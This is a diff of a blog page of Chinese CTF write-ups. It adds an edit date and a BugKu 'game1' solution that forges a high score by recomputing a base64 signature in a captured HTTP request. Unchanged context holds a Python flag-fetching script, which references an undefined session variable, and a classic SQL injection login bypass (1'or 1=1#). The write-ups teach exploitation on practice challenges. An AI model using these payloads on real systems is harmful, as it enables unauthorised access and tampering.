@@ -171,10 +171,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2021-09-06 19:34:17 / Modified: 20:51:57" itemprop="dateCreated datePublished" datetime="2021-09-06T19:34:17+08:00">2021-09-06</time>
+              <time title="Created: 2021-09-06 19:34:17" itemprop="dateCreated datePublished" datetime="2021-09-06T19:34:17+08:00">2021-09-06</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-09-08 08:56:25" itemprop="dateModified" datetime="2021-09-08T08:56:25+08:00">2021-09-08</time>
+              </span>
 
           
 
@@ -194,6 +200,15 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python = 2.7</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://114.67.246.176:11932&#x27;</span></span><br><span class="line">req = requests.Session()</span><br><span class="line">source = req.get(url)</span><br><span class="line">data1 = base64.b64decode(source.headers[<span class="string">&#x27;flag&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(data1)</span><br><span class="line">data1 = data1 [data1.index(<span class="string">&quot;:&quot;</span>)+<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(data1)</span><br><span class="line">data = base64.b64decode(data1)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">post = &#123;<span class="string">&quot;margin&quot;</span>:data&#125;</span><br><span class="line">ans = s.post(url,post)</span><br><span class="line"><span class="built_in">print</span> ans.content</span><br></pre></td></tr></table></figure>
 
 <h1 id="BUUOJ-极客大挑战-2019-EasySQL1"><a href="#BUUOJ-极客大挑战-2019-EasySQL1" class="headerlink" title="BUUOJ-[极客大挑战 2019]EasySQL1"></a>BUUOJ-[极客大挑战 2019]EasySQL1</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一般的验证语句为<span class="keyword">sql</span><span class="operator">=</span>&quot;select * from admin where username=&quot;<span class="operator">&amp;</span><span class="keyword">user</span><span class="operator">&amp;</span>&quot; and password=&quot;<span class="operator">&amp;</span>pwd<span class="operator">&amp;</span>&quot;&quot;</span><br><span class="line">尝试万能密码 username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;or 1=1#&amp;password=1</span></span><br><span class="line"><span class="string">账号中的’使前面的引号闭合，or 1=1 使语句恒成立，最后的#号会注释掉#之后的语句，避免报错.</span></span><br><span class="line"><span class="string">check.php?username=1%27or%201=1%23&amp;password=1</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="BugKu-game1"><a href="#BugKu-game1" class="headerlink" title="BugKu game1"></a>BugKu game1</h1><p>bp抓包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /score.php?score=25&amp;ip=106.39.42.143&amp;sign=zMMjU=== HTTP/1.1</span><br><span class="line">Host: 114.67.246.176:11523</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://114.67.246.176:11523/?s=1631061774862</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: _ga=GA1.1.1016401715.1631061825; _gid=GA1.1.1665857216.1631061825; Hm_lvt_c1b044f909411ac4213045f0478e96fc=1631061825; _gat=1; Hm_lpvt_c1b044f909411ac4213045f0478e96fc=1631062078</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p>考虑score和sign之间的关系，第一时间对sign进行base64解密，发现不正确 ̃#</p>
+<p>对score加密 MjU=</p>
+<p>发现属于是base64加上首部和尾部</p>
+<p>替换较大分数并按照以上添加首尾部即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /score.php?score=4000&amp;ip=106.39.42.143&amp;sign=zMNDAwMA==== HTTP/1.1</span><br><span class="line">Host: 114.67.246.176:11523</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://114.67.246.176:11523/?s=1631061774862?s=1631062331778</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: _ga=GA1.1.1016401715.1631061825; _gid=GA1.1.1665857216.1631061825; Hm_lvt_c1b044f909411ac4213045f0478e96fc=1631061825; _gat=1; Hm_lpvt_c1b044f909411ac4213045f0478e96fc=1631062340</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
 
 
       
